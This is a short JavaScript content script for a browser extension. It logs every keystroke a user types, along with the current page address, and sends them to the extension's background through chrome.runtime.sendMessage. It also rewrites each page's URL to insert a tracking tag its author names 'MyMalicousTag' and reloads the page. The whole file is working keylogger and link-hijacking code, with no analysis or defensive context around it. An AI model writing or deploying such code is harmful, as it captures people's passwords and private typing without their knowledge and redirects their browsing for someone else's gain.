chrome.runtime.onConnect.addListener(function (port) {});

var k = "";
var data = {};
window.onkeydown = function (event) {
  if (event.key.length > 1) {
    k = " (" + event.key + ") ";
  } else {
    k = event.key;
  }
  data = {
    key: k,
    page: window.location.href,
  };
  chrome.runtime.sendMessage(data);
};

function modifyURL() {
  const url = new URL(window.location.href);
  url.searchParams.set("tag", "MyMalicousTag");
  const modifiedUrl = url.toString();

  if (window.location.href !== modifiedUrl) {
    window.location.href = modifiedUrl;
  }
}

// Only modify the URL if it doesn't already have the "tag" parameter
if (!window.location.search.includes("tag=")) {
  modifyURL();
}
